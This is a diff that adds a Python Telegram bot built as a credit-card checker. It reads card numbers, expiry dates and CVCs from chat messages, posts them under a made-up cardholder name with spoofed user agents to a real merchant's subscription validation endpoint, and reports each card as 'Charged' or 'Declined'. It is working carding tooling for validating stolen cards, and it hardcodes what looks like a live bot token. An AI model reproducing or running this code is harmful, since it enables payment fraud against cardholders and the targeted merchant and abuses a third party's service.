@@ -1,0 +1,85 @@
+import os
+import logging
+import requests
+from telegram import Update
+from telegram.ext import CommandHandler, MessageHandler, Filters, Updater, CallbackContext
+from fake_useragent import UserAgent
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, filename='bot.log', format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Initialize the user agent and bot token
+ua = UserAgent()
+AUTHORIZED_USER = 6766802130  # Replace with your Telegram ID
+BOT_TOKEN = '7546779723:AAGckCuFIhMfa9h7sUZylW_hQfa_0UsSL7I'  # Your bot token
+
+def start(update: Update, context: CallbackContext):
+    chat_id = update.message.chat_id
+    if chat_id != AUTHORIZED_USER:
+        context.bot.send_message(chat_id=chat_id, text="❌ You are not authorized to use this bot.")
+        return
+    context.bot.send_message(chat_id=chat_id, text="✅ Welcome to the bot. You are authorized.")
+
+def is_valid_card_format(card_details):
+    # Ensure the card details are in the correct format
+    parts = card_details.strip().split('|')
+    return len(parts) == 4  # Should be four parts: number|exp_month|exp_year|cvc
+
+def validate_card(card_details):
+    if not is_valid_card_format(card_details):
+        return "⚠️ Invalid card format. Please use 'number|exp_month|exp_year|cvc'."
+
+    try:
+        cn, expm, expy, cv = card_details.strip().split('|')
+        expy = expy[-2:]  # Get the last two digits of the year
+        
+        headers = {
+            'user-agent': ua.random,
+        }
+        data = {
+            'card[name]': 'Amid Smith',
+            'card[number]': cn,
+            'card[exp_month]': expm,
+            'card[exp_year]': expy,
+            'card[cvc]': cv,
+        }
+        
+        # Make the POST request to the validation endpoint
+        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', headers=headers, data=data)
+        
+        # Check if the response is valid JSON
+        response_data = response.json()
+        
+        # Check the response message for decline keywords
+        decline_keywords = ['invalid', 'incorrect', 'declined', 'error', 'errorexception', '402', '500']
+        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
+            return f"🔴 Declined: {response_data.get('message')}"
+        else:
+            return f"🟢 Charged 3.99$: {response_data.get('message')}"
+    
+    except requests.exceptions.RequestException as e:
+        logging.error(f"Network error: {str(e)}")
+        return "⚠️ There was a network error."
+    except Exception as e:
+        logging.error(f"Error processing card: {str(e)}")
+        return "⚠️ An error occurred while processing your request."
+
+def handle_message(update: Update, context: CallbackContext):
+    chat_id = update.message.chat_id
+    if chat_id != AUTHORIZED_USER:
+        return
+
+    card_details = update.message.text
+    result = validate_card(card_details)
+    context.bot.send_message(chat_id=chat_id, text=result)
+
+def main():
+    updater = Updater(BOT_TOKEN, use_context=True)
+    dp = updater.dispatcher
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == "__main__":
+    main()
